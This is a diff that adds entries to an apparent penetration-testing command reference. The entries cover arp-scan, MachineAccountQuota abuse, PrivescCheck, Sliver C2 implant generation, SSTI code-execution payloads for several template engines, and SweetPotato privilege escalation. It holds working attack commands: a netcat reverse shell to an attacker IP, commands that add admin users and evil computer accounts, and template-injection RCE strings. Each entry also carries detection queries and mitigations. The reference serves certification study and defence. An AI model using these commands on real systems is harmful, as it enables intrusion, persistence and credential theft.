@@ -8862,6 +8862,103 @@ const COMMAND_DATA = {
       "explain": "ARP has no authentication - any host can broadcast false IP-to-MAC mappings.\nARP spoofing/poisoning enables MITM and DoS; ARP scanning is used for host discovery.\n=== ARP NORMAL OPERATION ===\n  1. Host A needs Host B's MAC - checks ARP cache\n  2. If not cached: broadcasts ARP request ('Who has <IP>?')\n  3. Host B replies with its MAC address\n  4. Host A upda..."
     },
     {
+      "id": "recon-arp-scan",
+      "name": "arp-scan - ARP Network Discovery",
+      "command": "arp-scan -l",
+      "description": "arp-scan sends ARP requests to discover hosts on the local network segment. Faster and more reliable than ping sweeps because ARP cannot be blocked by host firewalls. Identifies all live hosts, their MAC addresses, and vendor OUIs. Essential for initial network discovery in internal pentests.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Reconnaissance",
+      "subcategory": "Network Discovery",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "arp-scan; OSCP methodology",
+      "tags": [
+        "arp-scan",
+        "arp",
+        "network-discovery",
+        "host-discovery",
+        "mac-address",
+        "layer2"
+      ],
+      "mitre": [
+        "T1018"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC USAGE ===\n  arp-scan -l                    # Scan local subnet\n  arp-scan -l -I eth0            # Specify interface\n  arp-scan 192.168.1.0/24        # Scan specific range\n  arp-scan 10.10.10.0/24 -I tun0 # Scan through VPN\n\n=== OUTPUT ===\n  # Shows: IP, MAC, Vendor\n  # 192.168.1.1    aa:bb:cc:dd:ee:ff    Cisco Systems\n  # 192.168.1.100  11:22:33:44:55:66    VMware, Inc.\n\n=== USEFUL OPTIONS ===\n  arp-scan -l --retry=3          # More retries for reliability\n  arp-scan -l --bandwidth=100k   # Rate limit\n  arp-scan -l -q                 # Quiet (just IPs)\n  arp-scan -l -x                 # Show only responding hosts\n\n=== WHY ARP OVER PING ===\n- ARP is layer 2 - cannot be blocked by host firewalls\n- Much faster than ICMP ping sweeps\n- Reveals MAC addresses and vendor info\n- Works when ICMP is filtered\n- Only works on local subnet (not routable)\n\n=== ALTERNATIVES ===\n  nmap -sn -PR 192.168.1.0/24   # Nmap ARP scan\n  netdiscover -r 192.168.1.0/24 # Passive/active ARP\n  fping -a -g 192.168.1.0/24    # Fast ping sweep",
+      "examples": [
+        {
+          "label": "Scan local subnet",
+          "command": "arp-scan -l"
+        },
+        {
+          "label": "Scan specific range on interface",
+          "command": "arp-scan 10.10.10.0/24 -I tun0"
+        },
+        {
+          "label": "Quiet mode (just IPs)",
+          "command": "arp-scan -l -q"
+        }
+      ],
+      "references": [
+        {
+          "title": "arp-scan",
+          "url": "https://github.com/royhills/arp-scan"
+        },
+        {
+          "title": "MITRE T1018",
+          "url": "https://attack.mitre.org/techniques/T1018/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "nmap-host-discovery-sweep",
+          "note": "Nmap for broader network discovery beyond ARP range.",
+          "rel": "next"
+        },
+        {
+          "id": "recon-masscan",
+          "note": "Masscan for port scanning after host discovery.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ARP operates at Layer 2 and all devices must respond to ARP requests for normal network operation. Host-based firewalls cannot block ARP responses.",
+        "prerequisites": "Root/sudo access; target hosts on the same network segment.",
+        "impact": "Complete host inventory of local subnet; MAC address and vendor identification.",
+        "detection": "[MITRE T1018] ARP broadcast storms; high volume of ARP requests from a single source.",
+        "artifacts": "ARP traffic logs; switch CAM table flooding; IDS alerts for ARP scanning.",
+        "splunk_spl": "index=network sourcetype=arp\n| stats count by src_mac, dest_ip\n| where count > 100\n| sort -count",
+        "elastic_kql": "network.protocol:\"arp\" AND event.action:\"request\"",
+        "sentinel_kql": "CommonSecurityLog\n| where Protocol == \"ARP\"\n| summarize RequestCount=count() by SourceMACAddress, bin(TimeGenerated, 1m)\n| where RequestCount > 50",
+        "sigma_rules": "net_arp_scan_detection",
+        "prevention": "ARP inspection on switches; 802.1X port security; VLAN segmentation; monitor for ARP scan patterns.",
+        "sources": [
+          "OSCP methodology",
+          "https://attack.mitre.org/techniques/T1018/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "ARP scanning activity",
+            "logic": "title: ARP Network Scan Detection\nstatus: experimental\nlogsource:\n  category: network\n  service: arp\ndetection:\n  selection:\n    protocol: arp\n    action: request\n  timeframe: 1m\n  condition: selection | count() by src_mac > 50\nlevel: medium",
+            "data_source": "ndr",
+            "attack": [
+              "T1018"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "DHCP servers; legitimate network management tools; ARP monitoring",
+            "tuning": "Whitelist known network management MACs; adjust threshold for network size"
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-asrep-roasting",
       "name": "AS-REP Roasting (Rubeus)",
       "command": "Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt",
@@ -82262,6 +82359,111 @@ const COMMAND_DATA = {
       "explain": "Detect credential dumping from LSASS memory using Sysmon Event ID 10 (ProcessAccess).\nTools like Mimikatz open a handle to lsass.exe with specific access rights - Sysmon captures this handle request and records the calling process, enabling detection."
     },
     {
+      "id": "ad-machineaccountquota",
+      "name": "MachineAccountQuota (MAQ) Abuse - Adding Computer Accounts",
+      "command": "crackmapexec ldap <dc_ip> -u <user> -p <pass> -M maq",
+      "description": "By default, any domain user can add up to 10 computer accounts (ms-DS-MachineAccountQuota=10). These machine accounts can be used for RBCD attacks, Certifried exploitation, relaying, and Kerberos abuse. Checking and exploiting MAQ is a critical first step in many AD attack chains.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP MAQ abuse; AD attack chains",
+      "tags": [
+        "maq",
+        "machineaccountquota",
+        "computer-account",
+        "rbcd",
+        "impacket",
+        "addcomputer"
+      ],
+      "mitre": [
+        "T1136.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CHECK MAQ VALUE ===\n  # CrackMapExec:\n  crackmapexec ldap <dc_ip> -u <user> -p <pass> -M maq\n  # LDAP query:\n  ldapsearch -x -H ldap://<dc_ip> -D \"<user>@<domain>\" -w \"<pass>\" -b \"DC=<domain>,DC=local\" \"(objectClass=domain)\" ms-DS-MachineAccountQuota\n  # PowerShell:\n  Get-ADObject -Identity \"DC=<domain>,DC=local\" -Properties ms-DS-MachineAccountQuota\n\n=== ADD COMPUTER ACCOUNT ===\n  # Impacket:\n  addcomputer.py -computer-name EVIL$ -computer-pass Password123 <domain>/<user>:<pass>\n  # PowerMad:\n  New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString \"Password123\" -AsPlainText -Force)\n  # SharpMad:\n  SharpMad.exe add EVIL$ Password123\n\n=== ATTACK CHAINS REQUIRING MAQ ===\n  1. RBCD: Create machine -> delegate to target -> S4U2Self/Proxy\n  2. Certifried: Create machine -> spoof DC DNS -> request cert\n  3. Relay to LDAP: Relay auth -> create machine -> RBCD\n  4. Shadow Credentials: Machine account as delegation target\n\n=== DEFENSIVE VALUE ===\n  # Set MAQ to 0:\n  Set-ADDomain -Identity <domain> -Replace @{\"ms-DS-MachineAccountQuota\"=\"0\"}\n  # This blocks many attack chains that rely on machine account creation",
+      "examples": [
+        {
+          "label": "Check MAQ value",
+          "command": "crackmapexec ldap 192.168.1.10 -u jdoe -p Password123 -M maq"
+        },
+        {
+          "label": "Add computer account",
+          "command": "addcomputer.py -computer-name EVIL$ -computer-pass Password123 corp.local/jdoe:Password123"
+        },
+        {
+          "label": "PowerShell check MAQ",
+          "command": "Get-ADObject -Identity \"DC=corp,DC=local\" -Properties ms-DS-MachineAccountQuota"
+        }
+      ],
+      "references": [
+        {
+          "title": "MachineAccountQuota exploitation",
+          "url": "https://www.netspi.com/blog/technical-blog/network-penetration-testing/machineaccountquota-is-useful-sometimes/"
+        },
+        {
+          "title": "MITRE T1136.002",
+          "url": "https://attack.mitre.org/techniques/T1136/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-addcomputer",
+          "note": "addcomputer.py for creating the machine account.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-impacket-rbcd",
+          "note": "RBCD attack chain using the created machine account.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-certifried",
+          "note": "Certifried requires MAQ for machine account creation.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The default MachineAccountQuota of 10 allows any authenticated user to create computer accounts. These accounts can then be used as controlled principals for delegation attacks.",
+        "prerequisites": "Any domain user credentials; MAQ > 0 (default: 10).",
+        "impact": "Creates controlled machine accounts for RBCD, Certifried, relay, and other attack chains.",
+        "detection": "[MITRE T1136.002] Event 4741 (computer account created) by non-admin users.",
+        "artifacts": "Event 4741 with SubjectUserName as regular user; new computer object in default Computers OU.",
+        "splunk_spl": "index=windows EventCode=4741\n| where SubjectUserName NOT IN (\"SYSTEM\", \"Administrator\", \"*svc*\")\n| table _time, SubjectUserName, TargetUserName, SubjectDomainName",
+        "elastic_kql": "event.code:\"4741\" AND NOT user.name:(SYSTEM OR Administrator)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in (\"SYSTEM\", \"Administrator\")\n| project TimeGenerated, SubjectUserName, TargetUserName, Computer",
+        "sigma_rules": "win_security_maq_computer_account_creation",
+        "prevention": "Set ms-DS-MachineAccountQuota to 0; delegate machine account creation to specific groups only; monitor Event 4741.",
+        "sources": [
+          "CRTP MAQ module",
+          "https://attack.mitre.org/techniques/T1136/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Non-admin computer account creation (MAQ abuse)",
+            "logic": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in~ (\"SYSTEM\", \"Administrator\")\n| where SubjectUserName !has \"svc\"\n| project TimeGenerated, SubjectUserName, TargetUserName, Computer",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4741"
+            ],
+            "attack": [
+              "T1136.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Help desk joining workstations to domain; SCCM/MDM provisioning",
+            "tuning": "Whitelist known provisioning service accounts; alert on any other user creating computer accounts"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-m10-malware-overview",
       "name": "Malware Analysis Overview — Types, Methods & Evidence Acquisition",
       "command": "file /home/htb-student/Samples/MalwareAnalysis/<sample>.exe",
@@ -121175,6 +121377,99 @@ const COMMAND_DATA = {
       "explain": "Loads an attacker DLL as SYSTEM via the Print Spooler bug (CVE-2021-1675), remotely:\n  CVE-2021-1675.py         the impacket-based exploit\n  <domain>/<user>:<password>@<dc_ip>   authenticated domain creds and the target\n  '\\\\<attacker_ip>\\smb\\shell.dll'   UNC path to your malicious driver DLL on an SMB share\nThe spooler installs the driver and executes your DLL as SYSTEM. Invoke-Nightmare is the local PowerShell variant that just adds an admin."
     },
     {
+      "id": "privesc-privesccheck",
+      "name": "PrivescCheck - PowerShell Windows Privilege Escalation Auditor",
+      "command": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,HTML\"",
+      "description": "PrivescCheck is a comprehensive PowerShell script that checks for all common Windows privilege escalation vectors: service misconfigurations, unquoted paths, DLL hijacking, scheduled tasks, registry autoruns, credential files, and more. Modern replacement for PowerUp with better detection coverage.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "itm4n/PrivescCheck",
+      "tags": [
+        "privesccheck",
+        "powershell",
+        "privesc",
+        "windows-privesc",
+        "audit",
+        "enumeration"
+      ],
+      "mitre": [
+        "T1082"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC USAGE ===\n  powershell -ep bypass\n  . .\\PrivescCheck.ps1\n  Invoke-PrivescCheck\n\n=== EXTENDED CHECK + REPORT ===\n  Invoke-PrivescCheck -Extended -Report PrivescCheck_RESULTS -Format TXT,HTML\n\n=== WHAT IT CHECKS ===\n  # Services:\n  - Unquoted service paths\n  - Modifiable service binaries\n  - Modifiable service parameters\n  - World-writable service directories\n  # Registry:\n  - AlwaysInstallElevated\n  - AutoLogon credentials\n  - Autoruns with weak permissions\n  # Filesystem:\n  - DLL hijacking opportunities\n  - Writable PATH directories\n  - Writable program directories\n  # Scheduled Tasks:\n  - Modifiable task binaries\n  - Modifiable task directories\n  # Credentials:\n  - Cached credentials\n  - SAM backup files\n  - Unattend.xml files\n  - Web.config files\n  # Network:\n  - Open ports and services\n  - WiFi passwords\n\n=== COMPARISON ===\n  PrivescCheck:  Most comprehensive, actively maintained\n  PowerUp:       Classic but less maintained\n  WinPEAS:       C# binary, very thorough, noisier\n  Seatbelt:      GhostPack, more post-exploitation focused\n  SharpUp:       C# port of PowerUp",
+      "examples": [
+        {
+          "label": "Run all checks with report",
+          "command": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT,HTML\""
+        },
+        {
+          "label": "Basic check",
+          "command": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck\""
+        }
+      ],
+      "references": [
+        {
+          "title": "PrivescCheck",
+          "url": "https://github.com/itm4n/PrivescCheck"
+        },
+        {
+          "title": "MITRE T1082",
+          "url": "https://attack.mitre.org/techniques/T1082/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "winpe-tools",
+          "note": "WinPEAS for C# binary alternative with similar coverage.",
+          "rel": "alternative"
+        },
+        {
+          "id": "gs-privesc-enum",
+          "note": "LinPEAS for Linux privilege escalation enumeration.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "PrivescCheck systematically audits Windows configuration for privilege escalation vectors by checking file permissions, registry keys, service configurations, and credential storage.",
+        "prerequisites": "PowerShell execution on target; script uploaded or loaded in memory.",
+        "impact": "Identifies all local privilege escalation paths; guides attacker to SYSTEM.",
+        "detection": "[MITRE T1082] PowerShell script execution with enumeration patterns; accessing sensitive registry keys and service configurations.",
+        "artifacts": "PowerShell script block logging; access to service registry keys; WMI queries for services.",
+        "splunk_spl": "index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104 ScriptBlockText=\"*PrivescCheck*\"\n| table _time, ComputerName, ScriptBlockText",
+        "elastic_kql": "powershell.file.script_block_text:*PrivescCheck* OR powershell.file.script_block_text:*Invoke-PrivescCheck*",
+        "sentinel_kql": "DeviceEvents\n| where ActionType == \"PowerShellCommand\"\n| where AdditionalFields has \"PrivescCheck\"\n| project Timestamp, DeviceName, AccountName, AdditionalFields",
+        "sigma_rules": "win_powershell_privesccheck_execution",
+        "prevention": "Enable PowerShell Constrained Language Mode; script block logging; AMSI; restrict PowerShell execution policy.",
+        "sources": [
+          "itm4n/PrivescCheck",
+          "https://attack.mitre.org/techniques/T1082/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "PrivescCheck or privilege escalation enumeration script",
+            "logic": "DeviceProcessEvents\n| where FileName == \"powershell.exe\"\n| where ProcessCommandLine has_any (\"PrivescCheck\", \"Invoke-PrivescCheck\", \"PowerUp\", \"Invoke-AllChecks\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1082"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Security audit teams running authorized assessments",
+            "tuning": "Also detect by behavior: rapid enumeration of services, registry keys, and scheduled tasks"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -139963,6 +140258,100 @@ const COMMAND_DATA = {
       "explain": "Patches LSASS on a DC to add a master password that authenticates as ANY account alongside its real one:\n  Invoke-Mimikatz          run Mimikatz remotely\n  -Command '\"misc::skeleton\"'   inject the skeleton key into lsass on the DC\n  -ComputerName <dc_host>  the Domain Controller to patch (needs DA + code exec on the DC)\nAfterwards any user logs on with the password 'mimikatz' (or their own). It lives only in memory, so it does NOT survive a DC reboot - re-inject as needed."
     },
     {
+      "id": "ad-sliver-c2",
+      "name": "Sliver - Modern C2 Framework",
+      "command": "sliver > generate --mtls <ip> --os windows --arch amd64 --save implant.exe",
+      "description": "Sliver is an open-source, cross-platform C2 framework by BishopFox. It supports HTTP(S), mTLS, DNS, and WireGuard transports with anti-forensic features. Generates implants for Windows/Linux/macOS. Designed as a modern alternative to Cobalt Strike with built-in evasion capabilities.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Command & Control",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "BishopFox/sliver",
+      "tags": [
+        "sliver",
+        "c2",
+        "implant",
+        "beacon",
+        "mtls",
+        "command-and-control",
+        "post-exploitation"
+      ],
+      "mitre": [
+        "T1071.001",
+        "T1573.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  curl https://sliver.sh/install | sudo bash\n  # Or from releases: https://github.com/BishopFox/sliver/releases\n\n=== START SERVER ===\n  sliver-server\n  # Starts interactive console\n\n=== GENERATE IMPLANTS ===\n  # Session (interactive):\n  generate --mtls <ip>:443 --os windows --arch amd64 --save implant.exe\n  # Beacon (async, stealthier):\n  generate beacon --mtls <ip>:443 --os windows --arch amd64 --save beacon.exe --seconds 30\n  # Shellcode:\n  generate --mtls <ip>:443 --os windows --format shellcode --save payload.bin\n  # Linux:\n  generate --mtls <ip>:443 --os linux --save implant\n\n=== START LISTENERS ===\n  mtls --lhost 0.0.0.0 --lport 443\n  https --lhost 0.0.0.0 --lport 8443\n  dns --domains c2.example.com\n  wg --lhost 0.0.0.0 --lport 51820\n\n=== POST-EXPLOITATION ===\n  use <session_id>\n  execute-assembly /path/to/Rubeus.exe kerberoast\n  sideload /path/to/mimikatz.dll\n  getsystem                  # Attempt privesc\n  hashdump                   # Dump SAM\n  screenshot                 # Take screenshot\n  upload /local/path /remote/path\n  download /remote/path\n  portfwd add -b 127.0.0.1:8080 -r <target>:80\n  socks5 start\n\n=== COMPARISON ===\n  Sliver:        Free, open-source, modern. Good evasion.\n  Havoc:         Free, newer. Demon-based implants.\n  Cobalt Strike: Commercial, most mature. Widely detected.\n  Metasploit:    Free, framework. Less evasion.",
+      "examples": [
+        {
+          "label": "Start mTLS listener",
+          "command": "mtls --lhost 0.0.0.0 --lport 443"
+        },
+        {
+          "label": "Generate Windows beacon",
+          "command": "generate beacon --mtls 10.10.14.5:443 --os windows --arch amd64 --save beacon.exe --seconds 30"
+        },
+        {
+          "label": "Execute .NET assembly in memory",
+          "command": "execute-assembly /opt/Rubeus.exe kerberoast"
+        }
+      ],
+      "references": [
+        {
+          "title": "Sliver C2",
+          "url": "https://github.com/BishopFox/sliver"
+        },
+        {
+          "title": "Sliver Documentation",
+          "url": "https://sliver.sh/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-havoc-c2",
+          "note": "Havoc C2 alternative with Demon-based implants.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Sliver generates unique implants per-operation with encrypted C2 channels. Supports multiple transport protocols and anti-analysis techniques to evade detection.",
+        "prerequisites": "Sliver server running; implant delivered to target; network egress for C2 channel.",
+        "impact": "Full remote control of compromised hosts; lateral movement; credential access; data exfiltration.",
+        "detection": "[MITRE T1071.001] Encrypted C2 traffic patterns; unusual process behavior; in-memory .NET assembly loading.",
+        "artifacts": "Implant binary on disk; persistent C2 connections; process hollowing/injection; unusual DNS or HTTP patterns.",
+        "splunk_spl": "index=proxy (dest_port=443 OR dest_port=8443)\n| stats count, avg(bytes_out) as avg_out, stdev(bytes_out) as std_out by src_ip, dest_ip\n| where std_out < 100 AND count > 100",
+        "elastic_kql": "tls.client.ja3:* AND destination.port:(443 OR 8443) AND NOT destination.domain:*",
+        "sentinel_kql": "DeviceNetworkEvents\n| where RemotePort in (443, 8443)\n| summarize Beacons=count(), AvgBytes=avg(SentBytes) by InitiatingProcessFileName, RemoteIP, bin(Timestamp, 1h)\n| where Beacons > 50",
+        "sigma_rules": "net_connection_sliver_c2_beacon",
+        "prevention": "EDR with behavioral detection; network monitoring for C2 patterns; TLS inspection; block unknown binaries.",
+        "sources": [
+          "BishopFox Sliver",
+          "https://attack.mitre.org/techniques/T1071/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "C2 beacon pattern - regular interval callbacks",
+            "logic": "DeviceNetworkEvents\n| where RemotePort in (443, 8443, 80, 53)\n| summarize Connections=count(), Sources=dcount(RemoteIP) by InitiatingProcessFileName, bin(Timestamp, 30m)\n| where Connections > 20 and Sources == 1\n| where InitiatingProcessFileName !in~ (\"chrome.exe\", \"firefox.exe\", \"msedge.exe\", \"teams.exe\")",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1071.001",
+              "T1573.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate software with heartbeat connections; update checkers",
+            "tuning": "Focus on non-browser processes with regular callback intervals; JA3 fingerprinting for known C2 signatures"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -155847,6 +156236,99 @@ const COMMAND_DATA = {
       "explain": "Exploit SSTI in Jinja2 (Flask/Python) to read files and achieve RCE by walking Python's object hierarchy through __globals__ and __builtins__.:\n  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}\nThe __builtins__ path works in standard Flask/Jinja2."
     },
     {
+      "id": "web-ssti",
+      "name": "SSTI - Server-Side Template Injection",
+      "command": "curl -s \"http://<target>/page?name={{7*7}}\"",
+      "description": "Server-Side Template Injection occurs when user input is embedded directly into template engines (Jinja2, Twig, Freemarker, Velocity, etc.) instead of being passed as data. If the server renders {{7*7}} as 49, the template engine is evaluating user input, leading to RCE. Extremely common in Python/Flask, PHP/Twig, and Java applications.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Web Exploitation",
+      "subcategory": "Server-Side Injection",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "PortSwigger research; OWASP",
+      "tags": [
+        "ssti",
+        "template-injection",
+        "jinja2",
+        "twig",
+        "freemarker",
+        "rce",
+        "server-side"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DETECTION ===\n  {{7*7}}          # Returns 49? Vulnerable!\n  ${7*7}           # Alternative syntax (some engines)\n  #{7*7}           # Alternative syntax\n  {{7*\"7\"}}        # Returns 7777777? String multiplication (Jinja2)\n  {{7*\"7\"}}        # Returns 49? Arithmetic (Twig)\n\n=== JINJA2 (Python/Flask) ===\n  # Read file:\n  {{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}\n  # Shorter payloads:\n  {{config.items()}}\n  {{self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"whoami\").read()}}\n  # Via subclasses:\n  {{\"\".__class__.__mro__[1].__subclasses__()}}\n\n=== TWIG (PHP) ===\n  {{_self.env.registerUndefinedFilterCallback(\"exec\")}}\n  {{_self.env.getFilter(\"id\")}}\n\n=== FREEMARKER (Java) ===\n  <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}\n  ${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n\n=== VELOCITY (Java) ===\n  #set($x=\"\")\n  #set($cmd=$x.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\"))\n\n=== IDENTIFICATION CHART ===\n  {{7*7}}=49          -> Jinja2 or Twig\n  {{7*\"7\"}}=7777777   -> Jinja2\n  {{7*\"7\"}}=49        -> Twig\n  ${7*7}=49           -> Freemarker or Velocity\n  #{7*7}=49           -> Thymeleaf\n\n=== TPLMAP (automated) ===\n  tplmap -u \"http://<target>/page?name=*\"\n  tplmap -u \"http://<target>/page?name=*\" --os-shell",
+      "examples": [
+        {
+          "label": "Test for SSTI",
+          "command": "curl -s \"http://10.10.10.100/page?name={{7*7}}\""
+        },
+        {
+          "label": "Jinja2 RCE payload",
+          "command": "curl -s \"http://10.10.10.100/page?name={{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read()}}\""
+        },
+        {
+          "label": "Automated with tplmap",
+          "command": "tplmap -u \"http://10.10.10.100/page?name=*\" --os-shell"
+        }
+      ],
+      "references": [
+        {
+          "title": "PortSwigger - SSTI",
+          "url": "https://portswigger.net/research/server-side-template-injection"
+        },
+        {
+          "title": "HackTricks - SSTI",
+          "url": "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "exploit-deserialization",
+          "note": "Another server-side code execution vector via object injection.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Template engines evaluate expressions within template syntax markers. When user input is concatenated into templates instead of passed as variables, the engine executes attacker-controlled expressions.",
+        "prerequisites": "User input rendered in a template without proper sandboxing.",
+        "impact": "Remote code execution on the web server; file read; data exfiltration.",
+        "detection": "[MITRE T1059] Template syntax in request parameters; unusual process spawning from web application.",
+        "artifacts": "Web logs with template syntax ({{, ${, #{); child processes from web server (python, php, java).",
+        "splunk_spl": "index=web (uri_query=\"*{{*}}*\" OR uri_query=\"*${*}*\" OR uri_query=\"*#{*}*\" OR uri_query=\"*__class__*\" OR uri_query=\"*__import__*\")\n| table _time, src_ip, uri_path, uri_query, status",
+        "elastic_kql": "url.query:(*__class__* OR *__import__* OR *freemarker*)",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery has_any (\"__class__\", \"__import__\", \"freemarker\", \"_self.env\")\n| project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus",
+        "sigma_rules": "web_ssti_template_injection_attempt",
+        "prevention": "Pass user input as template variables, never concatenate into templates; use sandboxed template engines; WAF rules for template syntax.",
+        "sources": [
+          "PortSwigger research",
+          "https://attack.mitre.org/techniques/T1059/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SSTI template injection in web request",
+            "logic": "W3CIISLog\n| where csUriQuery matches regex @\"\\{\\{.*\\}\\}\" or csUriQuery matches regex @\"\\$\\{.*\\}\"\n| where csUriQuery has_any (\"__class__\", \"__import__\", \"popen\", \"exec\", \"Runtime\", \"freemarker\")\n| project TimeGenerated, cIP, csUriStem, csUriQuery, scStatus",
+            "data_source": "iis",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate template syntax in URLs (very rare); security testing tools",
+            "tuning": "Focus on payloads with code execution patterns rather than just template delimiters"
+          }
+        ]
+      }
+    },
+    {
       "id": "ssti-twig",
       "name": "SSTI - Twig (PHP/Symfony) Exploitation",
       "type": "payload",
@@ -158216,6 +158698,103 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Complete Suricata rule structure: header (action + protocol + IP/port + direction) and body (msg, content, flow, dsize, detection_filter, PCRE, buffers, modifiers).\nActions: alert/log/pass/drop/reject.\n=== RULE STRUCTURE ===\nFull format:\n  action proto src_ip src_port -> dst_ip dst_port (options)\n\nExample:\n  alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE...\"; content:\"pattern\"; si..."
+    },
+    {
+      "id": "privesc-sweetpotato",
+      "name": "SweetPotato - Multi-Technique Potato Privilege Escalation",
+      "command": "SweetPotato.exe -e EfsRpc -p C:\\temp\\nc.exe -a \"-e cmd.exe <ip> <port>\"",
+      "description": "SweetPotato combines multiple potato techniques into one tool: EfsPotato (EfsRpc), PrintSpoofer, and JuicyPotato techniques. Automatically selects the best technique for the target OS. Escalates from SeImpersonatePrivilege to SYSTEM on Windows Server 2008-2022.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "CCob/SweetPotato",
+      "tags": [
+        "sweetpotato",
+        "potato",
+        "seimpersonate",
+        "privesc",
+        "efspotato",
+        "system"
+      ],
+      "mitre": [
+        "T1134.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== TECHNIQUES ===\n  -e EfsRpc     # EfsPotato - works on most modern Windows\n  -e PrintSpoofer  # Uses print spooler named pipe\n  -e JuicyPotato  # COM server abuse (older Windows)\n\n=== USAGE ===\n  # Execute command as SYSTEM:\n  SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c whoami > C:\\temp\\out.txt\"\n  # Reverse shell:\n  SweetPotato.exe -e EfsRpc -p C:\\temp\\nc.exe -a \"-e cmd.exe <ip> <port>\"\n  # Add admin:\n  SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c net user hacker Pass123! /add && net localgroup administrators hacker /add\"\n\n=== WHICH POTATO WHEN ===\n  GodPotato:    All modern Windows. Most reliable.\n  SweetPotato:  Multi-technique, auto-selects. Good backup.\n  PrintSpoofer: If print spooler is running.\n  JuicyPotato:  Older Windows (2008-2016). Needs CLSID.\n  RoguePotato:  If outbound TCP is available.",
+      "examples": [
+        {
+          "label": "Execute as SYSTEM via EfsRpc",
+          "command": "SweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c whoami\""
+        },
+        {
+          "label": "Reverse shell as SYSTEM",
